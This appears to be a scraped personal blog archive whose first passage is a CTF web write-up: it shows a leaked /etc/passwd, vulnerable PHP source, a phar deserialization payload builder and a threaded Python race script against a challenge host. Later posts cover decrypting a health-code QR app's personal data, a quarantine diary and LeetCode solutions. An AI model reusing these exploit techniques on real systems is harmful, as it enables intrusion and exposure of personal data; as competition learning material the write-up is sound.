http://45632cf4-8a41-4ab2-bf06-65db1ccc6307.node4.buuoj.cn:81/uploads/head.pngroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/bin/false 然后就读源码了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#edit.php&lt;?phpini_set(&quot;error_reporting&quot;,&quot;0&quot;);class flag&#123; public function copyflag()&#123; exec(&quot;/copyflag&quot;); //以root权限复制/flag 到 /tmp/flag.txt，并chown www-data:www-data /tmp/flag.txt echo &quot;SFTQL&quot;; &#125; public function __destruct()&#123; $this-&gt;copyflag(); &#125;&#125;function filewrite($file,$data)&#123; unlink($file); file_put_contents($file, $data);&#125;if(isset($_POST[&#x27;png&#x27;]))&#123; $filename = $_POST[&#x27;png&#x27;]; if(!preg_match(&quot;/:|phar|\\/\\/|php/im&quot;,$filename))&#123; $f = fopen($filename,&quot;r&quot;); $contents = fread($f, filesize($filename)); if(strpos($contents,&quot;flag&#123;&quot;) !== false)&#123; filewrite($filename,&quot;Don&#x27;t give me flag!!!&quot;); &#125; &#125; if(isset($_POST[&#x27;flag&#x27;])) &#123; $flag = (string)$_POST[&#x27;flag&#x27;]; if ($flag == &quot;Give me flag&quot;) &#123; filewrite(&quot;/tmp/flag.txt&quot;, &quot;Don&#x27;t give me flag&quot;); sleep(2); die(&quot;no no no !&quot;); &#125; else &#123; filewrite(&quot;/tmp/flag.txt&quot;, $flag); //不给我看我自己写个flag。 &#125; $head = &quot;uploads/head.png&quot;; unlink($head); if (symlink($filename, $head)) &#123; echo &quot;成功更换头像&quot;; &#125; else &#123; unlink($filename); echo &quot;非正常文件，已被删除&quot;; &#125;; &#125;&#125; 一眼反序列化，但是半天没看见函数unserialize() 翻了翻笔记才想起来这玩意是phar反序列化 通过文件函数来触发反序列化 这里可以触发的有 fopen() file_put_contents() unlink() 首先参数png的正则绕不过去，后面两个函数filewrite()参数定死，函数unlink($head)参数定死 那就剩下最后一个函数unlink($filename)了 而执行函数unlink($filename)需要函数symlink($filename, $head) 尝试给filename塞个数组进去，symlink确实寄了，但是unlink也寄了 想来想去还是只能竞争symlink了 只要我请求够快，就会有两个PHP线程在unlink($head)之后执行symlink($filename, $head) 但是symlink()不能创建同名链接，所以慢的那个会False，然后运行unlink($filename)，即触发phar反序列化 即使触发了phar反序列化，flag内容被写入到了/tmp/flag.txt 要读取flag必定要symlink(&quot;/tmp/flag.txt&quot;, &quot;uploads/head.png&quot;)，然后访问head.png 但在此之前，会执行filewrite(&quot;/tmp/flag.txt&quot;, &quot;Don't give me flag&quot;);或filewrite(&quot;/tmp/flag.txt&quot;, $flag); 也就是说/tmp/flag.txt会被覆写，所以需要再进行一次竞争 但是从总体流程上来讲，这两次竞争完全可以放一起，以达到以下竞争效果 123456覆写错误flag -&gt;symlink链接phar文件 -&gt;symlink竞争触发unlink(phar) -&gt;覆写正确flag -&gt;symlink链接&#x2F;tmp&#x2F;flag.txt -&gt;读取正确flag 这个思路看起来有点天方夜谭，但是还是能竞争出来的 （这题做出来的时候总感觉自己是非预期解法） 123456789101112131415161718192021&lt;?php#php.ini: phar.readonly = Offclass flag&#123; public function copyflag()&#123; exec(&quot;/copyflag&quot;); //以root权限复制/flag 到 /tmp/flag.txt，并chown www-data:www-data /tmp/flag.txt echo &quot;SFTQL&quot;; &#125; public function __destruct()&#123; $this-&gt;copyflag(); &#125;&#125;$a = new flag();$phar = new Phar(&quot;exp.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;); //设置stub$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); //添加要压缩的文件$phar-&gt;stopBuffering();//签名自动计算?&gt; 1234567891011121314151617181920212223242526import requestsimport threadingreq = requests.session()url1 = &quot;http://270056b0-3eb6-4a8e-afc5-b70bdf3e8f4b.node4.buuoj.cn:81/uploads/head.png&quot;url2 = &quot;http://270056b0-3eb6-4a8e-afc5-b70bdf3e8f4b.node4.buuoj.cn:81/edit.php&quot;def unlink(): req.post(url2, data=&#123;&quot;png&quot;:&quot;phar:///var/www/html/uploads/01908b979c3dea9fc658e68ab8c560e4.png&quot;, &quot;flag&quot;:&quot;&quot;&#125;)def symlink(): req.post(url2, data=&#123;&quot;png&quot;:&quot;/tmp/flag.txt&quot;, &quot;flag&quot;:&quot;&quot;&#125;)if __name__ == &quot;__main__&quot;: for _ in range(10): t1 = threading.Thread(target=unlink, args=()) t2 = threading.Thread(target=symlink, args=()) t1.start() t2.start() while True: #getflag flag = req.get(url1).text if &quot;flag&quot; in flag: print(flag) break 12python exp.pyflag&#123;eea59afa-414d-4045-8d7f-808abc804951&#125; 两个题做了五个小时，只能明天打游戏了","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://yoloyolo.top/tags/Web/"},{"name":"PHP","slug":"PHP","permalink":"https://yoloyolo.top/tags/PHP/"},{"name":"POP","slug":"POP","permalink":"https://yoloyolo.top/tags/POP/"},{"name":"Unserialize","slug":"Unserialize","permalink":"https://yoloyolo.top/tags/Unserialize/"}]},{"title":"闽盾杯/黑盾杯 2021 WP","slug":"MinDunCup-2021","date":"2021-12-07T08:16:04.000Z","updated":"2022-05-14T16:00:19.000Z","comments":true,"path":"2021/12/07/MinDunCup-2021/","link":"","permalink":"https://yoloyolo.top/2021/12/07/MinDunCup-2021/","excerpt":"","text":"2/13 但是还是觉得自己菜得要死 福建省第二届“闽盾杯”网络空间安全大赛黑盾赛道WP","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"},{"name":"Windows","slug":"Windows","permalink":"https://yoloyolo.top/tags/Windows/"},{"name":"Cyber_Attribution","slug":"Cyber-Attribution","permalink":"https://yoloyolo.top/tags/Cyber-Attribution/"}]},{"title":"X闽健康码分析","slug":"X-Min-Health-Code","date":"2021-11-16T03:35:58.000Z","updated":"2022-06-27T18:16:01.000Z","comments":true,"path":"2021/11/15/X-Min-Health-Code/","link":"","permalink":"https://yoloyolo.top/2021/11/15/X-Min-Health-Code/","excerpt":"属于是白忙活了，但没完全白忙活","text":"属于是白忙活了，但没完全白忙活 起因是某个选修课的老师觉得我这个识别口罩自动开关门的项目太简单了，事实上我也觉得很简单，甚至自动开关门我都想用只一个被驱动的异步电机糊弄过去 后来想着加点活，然后想到了去医院体检的时候，医院门口的门禁是识别口罩+扫X闽健康码 所以就想着可能X闽健康码的内容应该挺好解析的 截图后丢直接微信扫一扫，和我想得一模一样的Base64编码 传到电脑上解码的时候蚌埠住了，估计是加密了，格式如下 “MZTJKM_” + 236字节Base64编码 + “#|” + 精确到毫秒的Unix时间戳 所以就想着去把中间的Base64解出来 然后凭着上次且仅一次的三个月前渗透APP的模糊记忆 打开jadx，先看看有没有双向认证，很庆幸是&quot;零向认证&quot; 搜索关键字&quot;AES&quot;，然后找了半天的密钥 换了&quot;CBC&quot;搜索，然后还找到了3DES的算法 感觉不对劲了 想办法抓手机APP的包，一通瞎摁点出了个请求X闽健康码的HTTP请求，虽说后面再也没摁出来过了 然后我拿着HTTP请求的URL回jadx接着搜索，然后浪费了一个小时 后来我才想到，这APP就是个壳子罢了 二维码的内容实际上还是Server给的 而且请求的URL不在APP里面而是在HTML页面里 然后开F12看JS去了，属实是有点坐牢 看到后面看到了个&quot;decrypt&quot;的字样，感觉有戏 跟进之后就是混淆的JS，此时感觉差不多寄了 先把JS反混淆一下大概看看 然后把混淆的代码丢console里，挨个跑被混淆的解密参数 然后从之前X闽健康码HTTP响应的json里扒拉出来data 解密之后得到了姓名，身份证号，健康状态，还有二维码的文本形式（没有后面的时间戳，时间戳是js另外加的）等 挺有意思都，新生杯密码学压轴就出这个了 到头来X闽健康码的内容还是不知道咋解析 回头想想去医院扫健康码的过程 要么是医院的门禁内置了X闽健康码的解密函数，能进一步提取里面的信息 要么那玩意就提取二维码的文本后匹配&quot;^MZTJKM_[0-9a-zA-Z+/=]{236}#|[0-9]{13}$&quot; 但是要是有人拿个红码能进去吗，应该不行 所以可能扫码有个颜色识别，这个我就不会了 后来又分析了下 16字节的分组加密，分组加密方式是ECB 我一开始以为应该是AES，后来跟老师讨论的时候说这种政府的项目应该是国密SM4之类的 根据我的猜测，中间存在一段在固定位置变动的22字节Base64编码，换算下来解码后正好差不多16字节 HTTP响应里也有个12字节的response_code会变动,所以这部分一直变动的16字节大概率是对应response_code 剩下4字节可以枚举，但是存在5种位置分布的情况 差不多(96 ** 4) * 5种可能 而且就算枚举出了全部的可能，也没办法通过明文与密文来还原出密钥，爆破16字节的密钥更不可能了，得爆破(256 ** 16) * (96 ** 4) * 5次，能爆破出来(96 ** 4) * 5个密钥，而且其中只有一个是对的 除非我有台量子计算机 也还有种可能，就是跟省人民政府去谈项目，但是没这个路子 总结来说就是，寄","categories":[{"name":"Talk","slug":"Talk","permalink":"https://yoloyolo.top/categories/Talk/"}],"tags":[{"name":"Unbengable","slug":"Unbengable","permalink":"https://yoloyolo.top/tags/Unbengable/"}]},{"title":"蚌埠的一天","slug":"Unbengable-Day","date":"2021-09-18T02:31:18.000Z","updated":"2022-05-14T16:12:39.000Z","comments":true,"path":"2021/09/17/Unbengable-Day/","link":"","permalink":"https://yoloyolo.top/2021/09/17/Unbengable-Day/","excerpt":"2021.09.16 根据真实事件改编，如有雷同，请务必对号入座","text":"2021.09.16 根据真实事件改编，如有雷同，请务必对号入座 因为疫情的原因，学校改为上网课 早八是一节线上实践课，课程主题是物联网安全 07:59的闹钟响了 连接腾讯会议之后便半睡半醒地听课 这个课是第一次上 确切来说是从第一周开始，但是第一周的课因为“机房装修”所以“暂时不上”，通知时间是08:32，距离上课时间过去了32分钟 第二周的课因为“还没有开始”所以也不上了，通知时间是00:43 然后老师开始说有哪些课程方向可以选 物联网设备隐私检测 指纹伪造 浏览器指纹 隐写 加密 取证 APP隐私检测 身份伪装 我寻思了一下 我把上学期写得烂尾Beacon隐写改改得了 然后就继续半睡半醒地听课了 蚌埠住了 后来一直不知道说啥玩意，他给的参考文档可能涉及内容敏感，所以会发一个加密的压缩包，然后再发一个密码 我觉得他有点在脱裤子放屁 然后他说让我们不要乱传这些文件，以防止触发审查机制带来不必要的麻烦 我寻思你不整点政治敏感监管人员都懒得看你一眼 然后发了个四川大学学生被通报用校园网浏览色情网站27次的截图，然后补了一句“每个学校的校园网都有这个审查机制” 我不知道他是在威慑我们还是他想说校园网有监管机制 我寻思这种东西开个代理不就没这么多事了 退一步来讲，学校的校园网弱口令泛滥得不想说了，盗用账号的收益/(成本*风险)比率可以说是要多高有多高了 然后说如果触发了审查机制与他无关 我顿时顿悟了，他之前所说一切的可能只是在为这一步做铺垫 蚌埠住了 扯东扯西扯到了九点半就不扯了 我能感觉到他之前的内容在尽力地拖时长，可能是因为这节课按照教学计划是要上到11:30 但是他真的尽力了，实在不知道扯啥了，所以让我们退出腾讯会议 蚌埠住了 然后我就开始上网冲浪 某女纪委被人爆出打女拳&amp;非法获利 八小时后就出了自检通告 自罚三杯不了了之 热心网友向督导组邮想投递邮件叙述情况被拒收 反而N**游戏社区接到电话被警告 “总不能什么都查吧，没准会查出什么来呢” 互联网真的太精彩辣 蚌埠住了 我上网冲浪完后室友回来说辅导员叫我去隔离 我问真的假的 他说真的 为什么要隔离呢 因为部门那边有个同事跟一个确诊的坐高铁同一排上 然后上周四部门吃饭博饼 我也不知道那个同事是谁，当时饭局的二十几桌 可能我在这头，他在那头 然后我就被算是次密接了 一桌的还在上班，不一桌的已经准备隔离了 蚌埠住了 辅导员在哪呢 疫情爆发的当晚就回同安看老婆去了 其他老师说让他住寝室，但是拉都拉不住 可能是因为到了第二天封校了 然后可能他那天就在家里跟我们开年级大会 强调我们学校不是封校，是非必要不外出 这已经是我第二次听了 然后过两天同安就封了 辅导员仍然坚持居家办公 这种精神我觉得值得我们学习 蚌埠住了 然后我就开始收拾东西准备隔离了 拉着行李箱去找楼管办外出手续 她问我干嘛 我说隔离 她摆在桌上的双臂下意识得往回收了下 填完手续就提着行李去隔离了 蚌埠住了 我们当天一共去了五个人吃饭，所以五个人一起隔离 我对辅导员得知公司那边的消息延迟持有怀疑态度 如果真是公司有跟学校沟通就不会疫情爆发了三天再叫我们去隔离 然后我们开始查内鬼 然后就内鬼自爆了 因为她的舍友一直叫她跟辅导员自爆 然后她今天就去跟辅导员自爆了 然后我们都被拉过来隔离了 我觉得她舍友如此为疫情防控着想，她应该也过来隔离，毕竟她算是密接的密接的密接了 我寻思核酸都有做过了，给我整得有点不会了 蚌埠住了 然后我们五个人在酒店门口站了十几分钟 我们与酒店有一个玻璃门相隔，这头是三十多度的日头，那头是二十六度的空调 但是保安不让进，支支吾吾得说要找对接医生 送我们隔离的老师就去打电话找对接医生 然后开始了经典的踢皮球 踢了十分钟就踢完了 我们登记之后领了房卡就进去了 保安不让我们用电梯 然后我们搬着行李走楼梯上了三楼 这可能是我一生中唯一一次走楼梯入住酒店了 蚌埠住了 到了房间之后插卡取电 我发现取电方式是传统的插卡取电 然后我就把我的学生卡插进去了 房间没有晾衣服的地方 我就把带的垃圾袋系成一根绳子 两端绑在阳台扶手跟水管 然后我就能晾衣服了 我也不知道我要隔离多久 可能七天，可能十四天，可能无期 反正免费的单间还是挺香的 蚌埠住了 然后我就去上厕所了 厕所里摆的是马桶 按照习惯，先拿卫生纸擦两遍，然后把纸丢马桶里防止溅水花 然后马桶就堵住了 可能是这个马桶的口径不太行 把水加到八成满还是没用 然后我就去打电话问前台能不能帮忙疏通马桶 前台支支吾吾得说现在疫情的情况不是很方便 然后我问能不能把马桶抽子放在我的门口，我自己抽两下子 然后前台支支吾吾得说去问一下 我就把之前洗热水壶烧的水倒进马桶 然后摁一下冲水，就通了 然后门铃响了，一个马桶抽子摆在门口 虽然我现在不需要这个马桶抽子 但是这个马桶抽子能给我带来无穷无尽的安全感 蚌埠住了 然后我就去洗澡了 浴室的玻璃门是透明的，我不知道这样的用意是什么 然后玻璃门的导轨有点歪，拉动后会向左边滑动 我觉得可能是浴室的地板可能歪得有点离谱了 蚌埠住了 然后有医务人员来做核酸检查 然后叫我扫一个二维码预约一下 我进入那个小程序的方式有点不对 让我选一个预约时间 然后小程序里选不了预约时间 然后必须要有预约时间才能提交这个预约 医务人员看着我弄了三四遍就说要我加他微信 叫我自己慢慢玩 预约上了把结果发给他 但是那个小程序我直接进去是要付费预约的 扫他给的码不用付费 所以我叫他把码再发一下 然后我就预约上了 通过控制变量法，我觉得可以证明是他的问题 蚌埠住了 然后我就去订餐群订餐了 有口水鸡套餐，红烧肉套餐，稀饭套餐 都是学校食堂打包过来的 价格都是12块 应该都是一荤二素 我五点半预约的饭 快七点才送到 我寻思这属实有点久了 然后就开始吃饭了 吃完饭我寻思一下发现垃圾袋不够用 房间里除了套垃圾桶上的也有没有多余垃圾袋 但是总是要丢垃圾的 所以我把垃圾丢盒饭的袋子里 然后把袋子丢门口了 蚌埠住了 然后我就开始打dota了 我在上高的时候跟我一起隔离的室友给我打电话叫我填一个隔离备案记录 我说叫他等下 我在破第二路高地的时候他又给我打电话了 我说马上打完 打完之后我去填那个隔离备案记录 然后我不知道该怎么填 我填得差不多了去问他是不是这样填 他说他帮我填好了 我说 谢谢 祝您生活愉快 再见 蚌埠住了 然后我后面在选人的时候又有华大的老师来打电话给我说 问我是因为什么被隔离的 我说次密接 他问我有没有接到防疫中心的电话 我说没有，是辅导员叫我隔离的 然后问了我一堆东西 我不是很清楚他要问的东西，而且我不是很想退掉这把dota 然后我就把我舍友的名字报给他了，叫他联系我舍友去了 然后我就继续dota了 然后我就感觉这次隔离可能就是因为有sb在瞎jb搞，是谁我不说 然后几个一起隔离的都跟我说可能明天就要解除隔离了 属于是白嫖了一个单间的钱 蚌埠住了","categories":[{"name":"Talk","slug":"Talk","permalink":"https://yoloyolo.top/categories/Talk/"}],"tags":[{"name":"Unbengable","slug":"Unbengable","permalink":"https://yoloyolo.top/tags/Unbengable/"}]},{"title":"LeetCode病历表","slug":"LeetCode","date":"2021-09-11T06:44:51.000Z","updated":"2022-06-10T17:47:23.000Z","comments":true,"path":"2021/09/11/LeetCode/","link":"","permalink":"https://yoloyolo.top/2021/09/11/LeetCode/","excerpt":"做课程项目的时候发现自己对算法一无所知 刷刷题吧","text":"做课程项目的时候发现自己对算法一无所知 刷刷题吧 两数之和 给定一个整数数组nums和一个整数目标值target，请你在该数组中找出和为目标值target的那两个整数，并返回它们的数组下标。 你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。 你可以按任意顺序返回答案。 示例 1： 123输入：nums &#x3D; [2,7,11,15], target &#x3D; 9输出：[0,1]解释：因为 nums[0] + nums[1] &#x3D;&#x3D; 9 ，返回 [0, 1] 。 示例 2： 12输入：nums &#x3D; [3,2,4], target &#x3D; 6输出：[1,2] 示例 3： 12输入：nums &#x3D; [3,3], target &#x3D; 6输出：[0,1] 来源：力扣（LeetCode） 链接：https://leetcode-cn.com/problems/two-sum 著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 暴力搜索，没啥好说的 1234567class Solution: def twoSum(self, nums: List[int], target: int) -&gt; List[int]: length = len(nums) for index1 in range(length): for index2 in range(index1+1, length): if nums[index1] + nums[index2] == target: return([index1, index2]) 后来想了一下，可以从奇偶相加规律的角度进行优化 Odd+Odd=EvenOdd + Odd = EvenOdd+Odd=Even Odd+Even=OddOdd + Even = OddOdd+Even=Odd Even+Even=EvenEven + Even = EvenEven+Even=Even 1234567891011121314151617181920212223242526272829class Solution: def twoSum(self, nums: List[int], target: int) -&gt; List[int]: odd = [] even = [] for index1 in nums: # 奇偶数分类 if index1 % 2 == 0: even.append(index1) else: odd.append(index1) len_odd = len(odd) len_even = len(even) if target % 2 == 0: # 偶数 if len_odd &gt; 1: for index1 in range(len_odd): for index2 in range(index1+1, len_odd): if odd[index1] + odd[index2] == target: idx = nums.index(odd[index1]) return([idx, nums.index(odd[index2], idx+1)]) if len_even &gt; 1: for index1 in range(len_even): for index2 in range(index1+1, len_even): if even[index1] + even[index2] == target: idx = nums.index(even[index1]) return([idx, nums.index(even[index2], idx+1)]) else: # 奇数 for index1 in range(len_odd): for index2 in range(len_even): if odd[index1] + even[index2] == target: return([nums.index(odd[index1]), nums.index(even[index2])]) 执行时间直接降了一半 两数相加 给你两个非空的链表，表示两个非负的整数。它们每位数字都是按照逆序的方式存储的，并且每个节点只能存储一位数字。 请你将两个数相加，并以相同形式返回一个表示和的链表。 你可以假设除了数字0之外，这两个数都不会以0开头。 示例 1： 123输入：l1 &#x3D; [2,4,3], l2 &#x3D; [5,6,4]输出：[7,0,8]解释：342 + 465 &#x3D; 807. 示例 2： 12输入：l1 &#x3D; [0], l2 &#x3D; [0]输出：[0] 示例 3： 12输入：l1 &#x3D; [9,9,9,9,9,9,9], l2 &#x3D; [9,9,9,9]输出：[8,9,9,9,0,0,0,1] 来源：力扣（LeetCode） 链接：https://leetcode-cn.com/problems/add-two-numbers 著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667# Definition for singly-linked list.# class ListNode:# def __init__(self, val=0, next=None):# self.val = val# self.next = nextclass Solution: def addTwoNumbers(self, l1: ListNode, l2: ListNode) -&gt; ListNode: temp_node = ListNode() head = temp_node overflow = False while True: # 两个链表同步部分 temp_node.val = l1.val + l2.val if overflow == True: overflow = False temp_node.val += 1 if temp_node.val &gt;= 10: overflow = True temp_node.val %= 10 if l1.next != None and l2.next != None: temp_node.next = ListNode() l1 = l1.next l2 = l2.next temp_node = temp_node.next else: break if l1.next == None and l2.next == None: # 两个链表同时结束 if overflow == True: temp_node.next = ListNode() temp_node = temp_node.next temp_node.val = 1 overflow == False return(head) else: # 一个链表提前结束 if l1.next != None: while True: l1 = l1.next temp_node.next = ListNode() temp_node = temp_node.next temp_node.val = l1.val if overflow == True: overflow = False temp_node.val += 1 if temp_node.val &gt;= 10: overflow = True temp_node.val %= 10 if l1.next == None: break elif l2.next != None: while True: l2 = l2.next temp_node.next = ListNode() temp_node = temp_node.next temp_node.val = l2.val if overflow == True: overflow = False temp_node.val += 1 if temp_node.val &gt;= 10: overflow = True temp_node.val %= 10 if l2.next == None: break if overflow == True: # 额外进位 temp_node.next = ListNode() temp_node = temp_node.next temp_node.val = 1 overflow == False return(head) 几个坑有点麻烦 两个链表长度不同，还得分l1、l2两种情况 进位，基本每一步计算都要检测进位 额外进位，两个二位数加出来一个三位数 无重复字符的最长子串 给定一个字符串s，请你找出其中不含有重复字符的最长子串的长度。 示例 1: 123输入: s &#x3D; &quot;abcabcbb&quot;输出: 3 解释: 因为无重复字符的最长子串是 &quot;abc&quot;，所以其长度为 3。 示例 2: 123输入: s &#x3D; &quot;bbbbb&quot;输出: 1解释: 因为无重复字符的最长子串是 &quot;b&quot;，所以其长度为 1。 示例 3: 1234输入: s &#x3D; &quot;pwwkew&quot;输出: 3解释: 因为无重复字符的最长子串是&quot;wke&quot;，所以其长度为 3。 请注意，你的答案必须是 子串 的长度，&quot;pwke&quot;是一个子序列，不是子串。 示例 4: 12输入: s &#x3D; &quot;&quot;输出: 0 来源：力扣（LeetCode） 链接：https://leetcode-cn.com/problems/longest-substring-without-repeating-characters 著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 123456789101112131415161718192021class Solution: def lengthOfLongestSubstring(self, s: str) -&gt; int: length = len(s) if length == 0: return(0) elif length == 1: return(1) else: sub_len = 0 for index1 in range(length): for index2 in range(index1+1, length): if s[index2] in s[index1:index2]: temp_len = index2 - index1 if temp_len &gt; sub_len: sub_len = temp_len break if index2 == length - 1: temp_len = index2 + 1 - index1 if temp_len &gt; sub_len: sub_len = temp_len return(sub_len) 依旧暴力搜索，有几个坑 空串 单字符 子串结尾与母串结尾相同 寻找两个正序数组的中位数 给定两个大小分别为m和n的正序（从小到大）数组nums1和nums2。请你找出并返回这两个正序数组的中位数。 示例 1： 123输入：nums1 &#x3D; [1,3], nums2 &#x3D; [2]输出：2.00000解释：合并数组 &#x3D; [1,2,3] ，中位数 2 示例 2： 123输入：nums1 &#x3D; [1,2], nums2 &#x3D; [3,4]输出：2.50000解释：合并数组 &#x3D; [1,2,3,4] ，中位数 (2 + 3) &#x2F; 2 &#x3D; 2.5 示例 3： 12输入：nums1 &#x3D; [0,0], nums2 &#x3D; [0,0]输出：0.00000 示例 4： 12输入：nums1 &#x3D; [], nums2 &#x3D; [1]输出：1.00000 示例 5： 12输入：nums1 &#x3D; [2], nums2 &#x3D; []输出：2.00000 来源：力扣（LeetCode） 链接：https://leetcode-cn.com/problems/median-of-two-sorted-arrays 著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 12345678910class Solution: def findMedianSortedArrays(self, nums1: List[int], nums2: List[int]) -&gt; float: new_list = nums1 + nums2 new_list.sort() length = len(new_list) if length % 2 == 1: mid_num = new_list[(length - 1)//2] else: mid_num = (new_list[(length)//2 - 1] + new_list[(length)//2]) / 2 return(mid_num) list().sort() yyds 最长回文子串 给你一个字符串s，找到s中最长的回文子串。 示例 1： 123输入：s &#x3D; &quot;babad&quot;输出：&quot;bab&quot;解释：&quot;aba&quot; 同样是符合题意的答案。 示例 2： 12输入：s &#x3D; &quot;cbbd&quot;输出：&quot;bb&quot; 示例 3： 12输入：s &#x3D; &quot;a&quot;输出：&quot;a&quot; 示例 4： 12输入：s &#x3D; &quot;ac&quot;输出：&quot;a&quot; 来源：力扣（LeetCode） 链接：https://leetcode-cn.com/problems/longest-palindromic-substring 著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 1234567891011121314151617class Solution: def longestPalindrome(self, s: str) -&gt; str: length = len(s) if length == 1: return(s) else: sub_str = &quot;&quot; sub_len = 0 for index1 in range(length): for index2 in range(length-1, index1-1, -1): if s[index2] == s[index1] and s[index1:index2+1] == s[index1:index2+1][::-1]: temp_len = index2 + 1 - index1 if temp_len &gt; sub_len: sub_len = temp_len sub_str = s[index1:index2+1] break return(sub_str) 看到&quot;ccc&quot;这个测试数据人都傻了 换个角度思考，逆向搜寻字符串就好解决这事了 Z 字形变换 将一个给定字符串s根据给定的行数numRows，以从上往下、从左到右进行Z字形排列。 比如输入字符串为&quot;PAYPALISHIRING&quot;行数为3时，排列如下： 123P A H NA P L S I I GY I R 之后，你的输出需要从左往右逐行读取，产生出一个新的字符串，比如：&quot;PAHNAPLSIIGYIR&quot;。 请你实现这个将字符串进行指定行数变换的函数： 1string convert(string s, int numRows); 示例 1： 12输入：s &#x3D; &quot;PAYPALISHIRING&quot;, numRows &#x3D; 3输出：&quot;PAHNAPLSIIGYIR&quot; 示例 2： 1234567输入：s &#x3D; &quot;PAYPALISHIRING&quot;, numRows &#x3D; 4输出：&quot;PINALSIGYAHRPI&quot;解释：P I NA L S I GY A H RP I 示例 3： 12输入：s &#x3D; &quot;A&quot;, numRows &#x3D; 1输出：&quot;A&quot; 来源：力扣（LeetCode） 链接：https://leetcode-cn.com/problems/zigzag-conversion 著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 12345678910111213141516171819202122232425class Solution: def convert(self, s: str, numRows: int) -&gt; str: if numRows == 1: return(s) length = len(s) forward = True y = -1 lst = [] for _ in range(numRows): lst.append(&quot;&quot;) for index in range(0, length): if forward == True: y += 1 lst[y] += s[index] if y == numRows-1: forward = False else: y -= 1 lst[y] += s[index] if y == 0: forward = True result = &quot;&quot; for _ in lst: result += _ return(result) 一开始各种算形状的周期、余数、重复次数 然后拿这些玩意算矩阵宽度 再造一个二维列表当矩阵 看到用时超过11%，内存超过7%就知道自己在犯病了 直接把这个题想象成一维的来回扫描模型就好多了 整数反转 给你一个32位的有符号整数x，返回将x中的数字部分反转后的结果。 如果反转后整数超过32位的有符号整数的范围[−231,231−1][-2^{31}, 2^{31} - 1][−231,231−1]，就返回0。 假设环境不允许存储64位整数（有符号或无符号）。 示例 1： 12输入：x &#x3D; 123输出：321 示例 2： 12输入：x &#x3D; -123输出：-321 示例 3： 12输入：x &#x3D; 120输出：21 示例 4： 12输入：x &#x3D; 0输出：0 来源：力扣（LeetCode） 链接：https://leetcode-cn.com/problems/reverse-integer 著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 12345678910111213141516171819202122class Solution: def reverse(self, x: int) -&gt; int: temp = [] negative = False if x &lt; 0: negative = True x = - x while x != 0: temp.append(x % 10) x //= 10 cnt = 0 num = 0 for _ in range(-1, -len(temp)-1, -1): num += temp[_] * pow(10, cnt) cnt += 1 if negative == True and num &lt;= pow(2,31): num = -num return(num) elif negative == False and num &lt;= pow(2,31) - 1: return(num) else: return(0) 挨个模10取余数丢列表 然后反向读列表就行 速度不错，但是内存太高了 字符串转换整数 (atoi) 请你来实现一个myAtoi(string s)函数，使其能将字符串转换成一个 32 位有符号整数（类似 C/C++ 中的atoi函数）。 函数myAtoi(string s)的算法如下： 读入字符串并丢弃无用的前导空格 检查下一个字符（假设还未到字符末尾）为正还是负号，读取该字符（如果有）。 确定最终结果是负数还是正数。 如果两者都不存在，则假定结果为正。 读入下一个字符，直到到达下一个非数字字符或到达输入的结尾。字符串的其余部分将被忽略。 将前面步骤读入的这些数字转换为整数（即，“123” -&gt; 123， “0032” -&gt; 32）。如果没有读入数字，则整数为 0 。必要时更改符号（从步骤 2 开始）。 如果整数数超过32位有符号整数范围[−231,231−1][-2^{31}, 2^{31} - 1][−231,231−1]，需要截断这个整数，使其保持在这个范围内。具体来说，小于−231-2^{31}−231的整数应该被固定为−231-2^{31}−231，大于231−12^{31}-1231−1的整数应该被固定为231−12^{31}-1231−1。 返回整数作为最终结果。 注意： 本题中的空白字符只包括空格字符’ '。 除前导空格或数字后的其余字符串外，请勿忽略任何其他字符。 示例1： 12345678910输入：s &#x3D; &quot;42&quot;输出：42解释：加粗的字符串为已经读入的字符，插入符号是当前读取的字符。第 1 步：&quot;42&quot;（当前没有读入字符，因为没有前导空格） ^第 2 步：&quot;42&quot;（当前没有读入字符，因为这里不存在 &#39;-&#39; 或者 &#39;+&#39;） ^第 3 步：&quot;42&quot;（读入 &quot;42&quot;） ^解析得到整数 42 。 由于 “42” 在范围[−231,231−1][-2^{31}, 2^{31} - 1][−231,231−1]内，最终结果为 42 。 示例2： 12345678910输入：s &#x3D; &quot; -42&quot;输出：-42解释：第 1 步：&quot; 